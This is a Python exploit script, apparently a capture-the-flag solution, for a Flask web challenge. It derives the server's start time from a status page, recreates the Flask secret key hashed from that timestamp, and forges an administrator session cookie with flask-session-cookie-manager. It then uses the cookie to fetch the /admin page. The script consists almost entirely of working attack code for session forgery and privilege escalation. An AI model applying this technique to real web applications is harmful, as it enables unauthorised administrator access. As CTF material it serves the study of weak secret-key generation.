import requests
import hashlib
import uuid
import os


'''
f5cf40bc95e40c5f3265654340ce14023d5111490d8f22699d757320dc01d73f
f5cf40bc95e40c5f3265654340ce14023d5111490d8f22699d757320dc01d73f


20240921023 113
20240921023114
'''

from flask import Flask, request, render_template, jsonify, abort, redirect, session
from datetime import datetime, timedelta



def get_server_info() -> tuple:
    data = requests.get("http://chal.competitivecyber.club:9999/status", timeout=5).text.strip().rstrip()
    # data = requests.get("http://127.0.0.1:9999/status", timeout=5).text.strip().rstrip()
    print(data.split())
    uptime = data.split()[2].replace('<br>', '')
    server_time = data.split()[5] + ' ' + data.split()[6]
    return (uptime, server_time)


def get_flag(SESSION):
    cookies: dict = {
        'session': f"{SESSION}"
    }

    # req = requests.get(url="http://127.0.0.1:9999/admin", cookies=cookies)
    req = requests.get(url="http://chal.competitivecyber.club:9999/admin", cookies=cookies)
    print(req.text)
    return req.status_code

def main():
    uptime, server_time = get_server_info()
    date_object = datetime.strptime(server_time, "%Y-%m-%d %H:%M:%S")

    # Now we need to subtract uptime from the server time to get the right secret key suffix
    # Time passed as a string
    hours, minutes, seconds = map(int, uptime.split(':'))


    # NOTE: I don't know why but I was off by 1 second EVERYTIME, so 
    # I just did a += 1
    seconds += 1
    time_passed = timedelta(hours=hours, minutes=minutes, seconds=seconds)


    # Subtracting time passed from the original datetime
    new_date_object = date_object - time_passed 


    print(new_date_object)

    # converting to a string bcs server does that for the secret session key
    server_start_str = new_date_object.strftime('%Y%m%d%H%M%S')


    secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()


    print(f"[ *** CALCULATED START STR: {server_start_str} ]")
    print(f"The secure key is: {secure_key}")



    command = """python3 ./flask-session-cookie-manager3.py encode -s '"""+  secure_key +"""' -t '{"username": "administrator","is_admin": True}' > SESSION.txt"""
    os.system(f"{command}")


    SESSION = open("SESSION.txt", 'r').read().strip().rstrip()

    get_flag(SESSION)


if __name__ == "__main__":
    main()